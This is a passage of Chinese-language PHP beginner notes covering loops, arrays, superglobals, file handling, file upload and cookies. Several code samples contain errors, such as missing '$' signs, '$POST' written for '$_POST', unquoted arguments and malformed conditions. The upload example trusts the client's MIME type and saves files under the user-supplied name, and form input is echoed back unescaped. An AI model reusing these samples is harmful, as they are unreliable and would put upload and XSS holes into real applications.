有且仅有一个为true，则返回true</li><li>&amp;&amp;</li><li>||</li><li>！</li></ol><h3 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h3><ol><li><ul><li>联合</li></ul></li><li>== 相等</li><li>=== 全等</li><li>!=</li><li>&lt;&gt;</li><li>!==</li></ol><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><h3 id="if-elseif-else"><a href="#if-elseif-else" class="headerlink" title="if elseif else"></a>if elseif else</h3><pre class="line-numbers language-none"><code class="language-none">if (条件) &#123;    语句;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="if-elseif-else-1"><a href="#if-elseif-else-1" class="headerlink" title="if elseif else"></a>if elseif else</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif()&#123;&#125;elseif()&#123;&#125;else&#123;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><ol><li>有选择地执行若干代码<pre class="line-numbers language-none"><code class="language-none">switch(expression)&#123;    case label1:        expression &#x3D; label1时执行的代码;        break;    case label2:        expression &#x3D; label2时执行的代码;        break;    default:        表达式的值不等于label1和label2时执行的代码&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>如果没有case为真，才使用default</li></ol><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><ol><li>while只要条件为真，循环执行</li><li>do while先执行一次代码块，然后只要指定条件为真，则重复循环（<strong>先做一次do，再判断while</strong>），即至少会执行一次语句，即使条件测试在第一次就失败了</li></ol><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><ol><li>提前确定了脚本运行的次数，用for循环<pre class="line-numbers language-none"><code class="language-none">for(init counter;test counter;increment counter)&#123;    code to be executed;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>第一个参数是初始化循环计数器的值</li><li>第二个参数是判断每个循环迭代，true继续，false结束</li><li>第三个参数是增加循环计数器的值<pre class="line-numbers language-none"><code class="language-none">&lt;?php    for($x&#x3D;0;$x&lt;&#x3D;10;$x++)&#123;        echo &quot;xxx&quot;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3></li><li>定义（1）</li><li>判断（2）</li><li>执行循环体语句</li><li>改变循环变量（3）</li></ol><h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><ol><li>foreach循环只用于数组，用于遍历数组中的每个键值对<pre class="line-numbers language-none"><code class="language-none">foreach($array as $value)&#123;    执行代码&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>每一次循环迭代，当前数组的值就会赋给$value变量，并且数组指针会逐一移动，直到到达最后一个数组元素<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $color &#x3D; array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;);    foreach($color as $value)&#123; &#x2F;&#x2F;类似于c++中的范围遍历，将$color数组中的每一个元素作为value        echo &quot;value&quot;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="php真正的力量，来自于它的函数，php拥有超过1000个内建的函数"><a href="#php真正的力量，来自于它的函数，php拥有超过1000个内建的函数" class="headerlink" title="php真正的力量，来自于它的函数，php拥有超过1000个内建的函数"></a>php真正的力量，来自于它的函数，php拥有超过1000个内建的函数</h3><h3 id="用户定义函数"><a href="#用户定义函数" class="headerlink" title="用户定义函数"></a>用户定义函数</h3><ol><li>以单词function开头<pre class="line-numbers language-none"><code class="language-none">function functionname()&#123;    被执行的代码;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>函数名对大小写不敏感</li></ol><h3 id="php函数参数"><a href="#php函数参数" class="headerlink" title="php函数参数"></a>php函数参数</h3><ol><li>通过参数向函数传递信息，参数类似于变量</li><li>逗号隔开参数<pre class="line-numbers language-none"><code class="language-none">&lt;?php    function family($name)&#123;        echo &quot;$name&quot;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="默认参数值"><a href="#默认参数值" class="headerlink" title="默认参数值"></a>默认参数值</h3><ol><li>如果调用没有参数的函数，参数会取默认值</li><li>默认参数值只会发生在函数的<strong>调用过程</strong>中<pre class="line-numbers language-none"><code class="language-none">&lt;?php    function setheight($min&#x3D;60)&#123;        echo &quot;height is $min&quot;;    &#125;    setheight();     &#x2F;&#x2F;无参数，使用默认值60    setheight(100);  &#x2F;&#x2F;有参数，不适用默认值，使用传入的100?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="php函数返回值"><a href="#php函数返回值" class="headerlink" title="php函数返回值"></a>php函数返回值</h3><ol><li>使用返回值，用return</li><li>当函数内部使用形参时，想要往外输出参数，则需要return，因为形参不是全局变量、</li></ol><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数组能够在单独的变量名中存储一个或多个值"><a href="#数组能够在单独的变量名中存储一个或多个值" class="headerlink" title="数组能够在单独的变量名中存储一个或多个值"></a>数组能够在单独的<strong>变量名</strong>中存储一个或多个值</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);    echo &quot;I like&quot; . $cars[0] . &quot;,&quot; . $cars[1] . &quot;,&quot; . cars[2] . &quot;.&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="定义方法"><a href="#定义方法" class="headerlink" title="定义方法"></a>定义方法</h3><ol><li>array()函数用于创建函数<h4 id="三种数组类型"><a href="#三种数组类型" class="headerlink" title="三种数组类型"></a>三种数组类型</h4></li><li>索引数组 - 带有数字索引的数组</li><li>关联数组 - 带有指定键的数组</li><li>多维数组 - 包含一个或多个数组的数组</li></ol><h4 id="索引数组"><a href="#索引数组" class="headerlink" title="索引数组"></a>索引数组</h4><h5 id="索引是自动分配的"><a href="#索引是自动分配的" class="headerlink" title="索引是自动分配的"></a>索引是自动分配的</h5><ol><li>索引自动分配，从0开始<pre class="line-numbers language-none"><code class="language-none">$cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);等价于$cars[0] &#x3D; &#39;a&#39;;$cars[1] &#x3D; &#39;b&#39;;$cars[2] &#x3D; &#39;c&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h4><ol><li>count()函数，即返回元素个数<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);    echo count($cars); &#x2F;&#x2F;运行结果即为3?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="遍历索引函数"><a href="#遍历索引函数" class="headerlink" title="遍历索引函数"></a>遍历索引函数</h4><ol><li>可以使用for循环遍历并输出索引数组的所有值<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);    $arrlength&#x3D;count($cars);    for($x&#x3D;0;$x &lt; $arrlength;$x++)&#123;        echo $cars[x];        echo &quot;&lt;br&gt;&quot;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h4><ol><li>关联数组是使用分配给数组的指定键的数组<pre class="line-numbers language-none"><code class="language-none">$age&#x3D;array(&quot;bill&quot; &#x3D;&gt; &quot;35&quot;,&quot;steve&quot; &#x3D;&gt; &quot;36&quot;,&quot;elon&quot; &#x3D;&gt; &quot;37&quot;);等价于$age[&quot;bill&quot;]&#x3D;&quot;35&quot;;$age[&quot;steve&quot;]&#x3D;&quot;36&quot;;$age[&quot;elon&quot;]&#x3D;&quot;37&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>语法：array(“键”=&gt;”值”,”键”=&gt;”值”);</li></ol><h5 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h5><ol><li>使用foreach循环，遍历并输出关联数组的所有值<pre class="line-numbers language-none"><code class="language-none">foreach($age as $x&#x3D;&gt;$x_value)&#123;    echo &quot;key&#x3D;&quot;.$x.&quot;,value&#x3D;&quot;.$x_value;    echo &quot;&lt;br&gt;&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><h3 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h3><ol><li>以升序对数组排序<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);    sort($cars);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="rsort"><a href="#rsort" class="headerlink" title="rsort()"></a>rsort()</h3><ol><li>按照ascii码降序对数组进行排序,reverse的sort();<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);    rsort($cars);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="asort"><a href="#asort" class="headerlink" title="asort()"></a>asort()</h3><ol><li>根据值对数组进行升序排序</li><li>排序对象是关联数组，排序的根据是键值对的值<?php $age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47"); asort($age);?></li></ol><h3 id="ksort"><a href="#ksort" class="headerlink" title="ksort()"></a>ksort()</h3><ol><li>根据键对关联数组进行排序</li><li>排序对象是关联数组，排序的根据是键值对的键<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $age&#x3D;array(&quot;Bill&quot;&#x3D;&gt;&quot;63&quot;,&quot;Steve&quot;&#x3D;&gt;&quot;56&quot;,&quot;Elon&quot;&#x3D;&gt;&quot;47&quot;);    ksort($age);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="arsort"><a href="#arsort" class="headerlink" title="arsort()"></a>arsort()</h3><ol><li>根据值对关联数组进行降序排序</li></ol><h3 id="krsort"><a href="#krsort" class="headerlink" title="krsort()"></a>krsort()</h3><ol><li>根据键对关联数组进行降序排序</li></ol><h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a><strong>超全局变量</strong></h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ol><li>php中许多预定义变量都是超全局的，这意味着他们在一个脚本的全部作用域中都可用，无需执行global<pre class="line-numbers language-none"><code class="language-none">$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><ol><li>用于在PHP脚本中的任意位置访问全局变量</li><li>PHP在名为$GLOBALS[index]的数组中存储了所有全局变量，变量的名字就是数组的键(逐一这个地方是数组的名字，是去掉$的数组名字再加上单引号括起来)<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $x&#x3D;1;    $y&#x3D;2;    function addition() &#123;        $GLOBALS[&#39;$z&#39;] &#x3D; $GLOBALS[&#39;$x&#39;] + $GLOBALS[&#39;$y&#39;];    &#125;    addition();    echo $z;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="server"><a href="#server" class="headerlink" title="$_server"></a>$_server</h3><ol><li>$_server这种超全局变量保存关于报头，路径和脚本位置的信息<pre class="line-numbers language-none"><code class="language-none">&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;SERVER_NAME&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_HOST&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_REFERER&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_USER_AGENT&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;SCRIPT_NAME&#39;];?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>$_server中访问的最重要的元素<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712002132.png"></li><li>重要的<pre class="line-numbers language-none"><code class="language-none">$_server[&#39;REQUEST_METHOD&#39;];返回访问页面使用的请求方法，例如post和get$_server[&#39;SERVER_ADDR&#39;];返回当前脚本所在的服务器的IP地址$_server[&#39;PHP_SELF&#39;];返回当前执行脚本的文件名$_server[&#39;SERVER_NAME&#39;];返回当前运行脚本所在的服务器的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><ol><li>用于收集HTML表单提交的数据</li><li>下面是一个包含输入字段和提交按钮的表单，当用户通过点击提交按钮来提交表单数据时，表单将发送到<form>标签的 action 属性中指定的脚本文件.</li><li>在这个例子中，我们指定文件本身来处理表单数据。如果您需要使用其他的 PHP 文件来处理表单数据，请修改为您选择的文件名即可。然后，我们可以使用超级全局变量 $_REQUEST 来收集 input 字段的值：<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;body&gt;&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;form&gt;&lt;?php $name &#x3D; $_REQUEST[&#39;fname&#39;]; echo $name; ?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="post"><a href="#post" class="headerlink" title="$_post"></a>$_post</h3><ol><li>广泛用于收集method=”post”的HTML表单后的表单数据<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;body&gt;&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]?&gt;&quot;&gt;Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;;&lt;input type&#x3D;&quot;submit&quot;&gt;;&lt;&#x2F;form&gt;&lt;?php    $name &#x3D; $POST[&#39;fname&#39;];    echo $name;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="get"><a href="#get" class="headerlink" title="$_get"></a>$_get</h3><ol><li>用于提交HTML表单(method=”get”)之后的表单数据</li><li>$GET 也可以收集URL中发送的数据</li></ol><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol><li>上面的$_POST和$_GET都是变量，类似于$GLOBAL,存储了脚本中的所有POST或者GET方法传入的参数</li><li>使用方法和$GLOBAL类似<pre class="line-numbers language-none"><code class="language-none">echo $_GET[&quot;name&quot;];echo $_POST[&quot;age&quot;];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ol><li>$_GET是通过URL参数传递到当前脚本的变量数组</li><li>$_POST是通过HTTP POST传递到当前脚本的变量数组</li></ol><h3 id="何时使用"><a href="#何时使用" class="headerlink" title="何时使用"></a>何时使用</h3><ol><li>GET 方法从表单发送的信息对任何人都是可见的（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。GET 可用于发送非敏感的数据。</li><li>GET可以看见<strong>注入点</strong>（发送的信息的变量名）</li><li>POST 方法从表单发送的信息对其他人是不可见的（所有名称/值会被嵌入 HTTP 请求的主体中）并且对所发送信息的数量也无限制。<h1 id="PHP文件处理"><a href="#PHP文件处理" class="headerlink" title="PHP文件处理"></a>PHP文件处理</h1><h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h2></li><li>readfile()函数读取文件，并把它写入输出缓冲</li><li>假设我们有一个名为 “webdictionary.txt” 的文本文件，存放在服务器上，就像这样：<pre class="line-numbers language-none"><code class="language-none">AJAX &#x3D; Asynchronous JavaScript and XMLCSS &#x3D; Cascading Style SheetsHTML &#x3D; Hyper Text Markup LanguagePHP &#x3D; PHP Hypertext PreprocessorSQL &#x3D; Structured Query LanguageSVG &#x3D; Scalable Vector GraphicsXML &#x3D; EXtensible Markup Language<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>读取此文件并且写到输出流的PHP代码如下：读取成功则readfile()函数<strong>返回字节数</strong><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho readfile(webdictionary.txt);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h2><ol><li>提供比readfile()更多的选项</li><li>fopen的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $myfile&#x3D;fopen(&quot;webdictionary.txt&quot;,&quot;r&quot;) or die(&quot;unable to open file&quot;);    fclose($myfile);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="文件打开的模式"><a href="#文件打开的模式" class="headerlink" title="文件打开的模式"></a>文件打开的模式</h2><ol><li>带+的读写都有<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220730140021.png"></li><li>r读</li><li>w重写</li><li>a追加写</li><li>x执行</li></ol><h2 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h2><ol><li>fread()读取打开的文件</li><li>fread()的第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数</li></ol><h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a>fclose()</h2><ol><li>fclose()函数用于关闭打开的文件</li><li>用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。</li><li>fclose需要待关闭的文件的名称，或者存有文件名的变量</li></ol><h2 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h2><ol><li>fgets()函数用于从文件中读取单行</li><li>调用fgets()函数之后，文件指针会移动到下一行</li></ol><h2 id="feof"><a href="#feof" class="headerlink" title="feof()"></a>feof()</h2><ol><li>feof()函数检查是否已经到达end of file</li><li>feof()对于遍历未知长度的数据很有用<pre class="line-numbers language-none"><code class="language-none">&lt;?php$myfile&#x3D;fopen(&quot;a.txt&quot;,&quot;r&quot;) or die(&quot;unable to open file&quot;);while(!feof($myfile))&#123;    echo fgets($myfile).&lt;br&gt;;&#125;fclose($myfile);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="fgetc"><a href="#fgetc" class="headerlink" title="fgetc()"></a>fgetc()</h2><ol><li>fgetc()函数用于从文件中读取单个字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php    fopen(&quot;a.txt&quot;,&quot;r&quot;) or die(&quot;unable&quot;);    while(!feof($myfile))&#123;        echo fgetc($myfile);    &#125;    fclose($myfile);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="fopen-1"><a href="#fopen-1" class="headerlink" title="fopen()"></a>fopen()</h2><ol><li>fopen()函数用于创建文件</li><li>在php中，创建文件所用的函数和打开文件的相同</li><li>如果fopen()没有遍历到文件，就会创建一个文件<pre class="line-numbers language-none"><code class="language-none">$myfile&#x3D;fopen(&quot;a.txt&quot;,&quot;w&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a>fwrite()</h2><ol><li>fwrite()函数用于写入文件</li><li>fwrite()的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串<pre class="line-numbers language-none"><code class="language-none">&lt;?php$myfile&#x3D;fopen(&quot;newfile.txt&quot;,&quot;w&quot;) or die(&quot;unable&quot;);$txt&#x3D;&quot;a&quot;;fwrite($myfile,$txt);&#x2F;&#x2F;写a$txt&#x3D;&quot;b&quot;;fwrite($myfile,$txt);&#x2F;&#x2F;写bfclose($myfile);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="PHP文件上传"><a href="#PHP文件上传" class="headerlink" title="PHP文件上传"></a>PHP文件上传</h1><h2 id="创建一个文件上传表单"><a href="#创建一个文件上传表单" class="headerlink" title="创建一个文件上传表单"></a>创建一个文件上传表单</h2><pre class="line-numbers language-none"><code class="language-none">&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>&lt;\form&gt;标签的enctype属性规定了在提交表单时要使用哪种内容类型，在表单需要使用二进制数据时，比如文件内容，请使用”multipart/form-data”</li><li>&lt;\input&gt;标签的type=”file”属性规定了应该把输入作为文件来处理，举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</li></ol><h2 id="创建上传脚本"><a href="#创建上传脚本" class="headerlink" title="创建上传脚本"></a>创建上传脚本</h2><ol><li>upload_file.php文件含有供文件上传的代码</li><li>通过使用PHP的全局数组$_FILE，可以从客户端计算机向远程服务器上传文件</li></ol><h3 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h3><ol><li>第一个参数是input name</li><li>第二个下标可以是name type size tmp_name error<pre class="line-numbers language-none"><code class="language-none">$_FILES[&quot;file&quot;][&quot;name&quot;] 被上传文件的名称$_FILES[&quot;file&quot;][&quot;type&quot;] 被上传的文件类型$_FILES[&quot;file&quot;][&quot;size&quot;] 被上传的文件大小，以字节计算$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] 存储在服务器的文件的临时副本名称$_FILES[&quot;file&quot;][&quot;error&quot;] 由文件上传导致的错误代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>总之$_FILES超全局变量的作用就是用来上传文件的</li></ol><h2 id="设置上传限制"><a href="#设置上传限制" class="headerlink" title="设置上传限制"></a>设置上传限制</h2><ol><li>只能上传gif或者jpeg文件<pre class="line-numbers language-none"><code class="language-none">if((($_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;) || $_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39; || $_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;pjpeg&#39;)) &amp;&amp; ($_FILES[&#39;file&#39;][&#39;size&#39;] &lt; 20000&gt;))&#123;    if($_FILES[&#39;file&#39;][&#39;error&#39;] &gt; 0) &#x2F;&#x2F; 这个地方如果为error则错误代码&gt;0    &#123;        echo &quot;ERROR&quot; . $_FILES[&#39;file&#39;][&#39;error&#39;] . &quot;&lt;br &#x2F;&gt;&quot;    &#125;    else&#123;        echo &quot;UPLOAD-name&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &lt;br &#x2F;&gt;        echo &quot;Type&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &lt;br &#x2F;&gt;        echo &quot;Size&quot; . $_FILES[&#39;file&#39;][&#39;size&#39;] . &quot;byte&quot; . &lt;br &#x2F;&gt;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="保存被上传的文件"><a href="#保存被上传的文件" class="headerlink" title="保存被上传的文件"></a>保存被上传的文件</h2><ol><li>上面的例子在服务器的PHP临时文件夹中创建了一个临时副本</li><li>这个临时副本会在脚本结束时消失，要保存被上传的文件，我们需要把它拷贝到另外的位置<pre class="line-numbers language-none"><code class="language-none">if(file_exists(&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;    echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;already exists.&quot;;&#125;else&#123;    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);    echo &quot;stored in:&quot; . &quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>上面的脚本检测了是否已经存在了此文件，如果不存在，则把文件拷贝到指定的文件夹</li><li>file_exists() 检测在指定目录下是否有文件名的文件存在</li><li>move_uploaded_file() 移动文件</li></ol><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie"></a>什么是cookie</h2><ol><li>cookie常用于识别用户，cookie是服务器留在用户计算机中的小文件，每当相同的计算机通过浏览器请求页面时，它同时会发送cookie.通过php,您能够创建并取回cookie的值</li><li>注意一定是服务器留在用户计算机中的，服务器-&gt;用户计算机</li></ol><h2 id="创建cookie"><a href="#创建cookie" class="headerlink" title="创建cookie"></a>创建cookie</h2><ol><li>setcookie()函数用来设置cookie</li><li>setcookie()函数必须位于&lt;\html&gt;标签之前<pre class="line-numbers language-none"><code class="language-none">setcookie(name,value,expire,path,domain)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>创建用户名为user的cookie，将它赋值为alex port，规定在一小时后过期<pre class="line-numbers language-none"><code class="language-none">&lt;?php     setcookie(&quot;user&quot;,&quot;alex port&quot;,time()+3600);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>在发送cookie时，cookie的值会自动进行URL编码，在取回时自动解码</li><li>为了防止URL编码，使用setrawcookie()函数取代，set 设置,raw 生的，没有改变进行URL编码的cookie</li></ol><h2 id="取回cookie的值"><a href="#取回cookie的值" class="headerlink" title="取回cookie的值"></a>取回cookie的值</h2><ol><li>$_COOKIE超全局变量用于取回cookie的值</li><li>取回名为user的cookie值，并且显示<pre class="line-numbers language-none"><code class="language-none">echo $_COOKIE[&#39;user&#39;];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>使用isset()函数来确认是否已经设置了cookie<pre class="line-numbers language-none"><code class="language-none">&lt;?php    if(isset($_COOKIE[&quot;user&quot;]))        echo &quot;welcome&quot; . $_COOKIE[&#39;user&#39;] . &lt;br &#x2F;&gt;    else        echo &quot;welcome guest&quot; . &lt;br &#x2F;&gt;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h2><ol><li>当删除cookie时，应该使用过期日期变更为过去的时间点</li><li>如果过期日期在过去的时间点，则认为过去已经过期<pre class="line-numbers language-none"><code class="language-none">&lt;?php    setcookie(&quot;user&quot;,&quot;&quot;,time()-3600);&#x2F;&#x2F;默认为cookie的名称为user,值为空，时间在过去一个小时的时候已经过期?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="php错误处理"><a href="#php错误处理" class="headerlink" title="php错误处理"></a>php错误处理</h1><h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><ol><li>在php中，默认的错误处理很简单，一条消息会被发送到浏览器，这条消息带有文件名，行号，以及一条错误的信息</li></ol><h2 id="php错误处理-1"><a href="#php错误处理-1" class="headerlink" 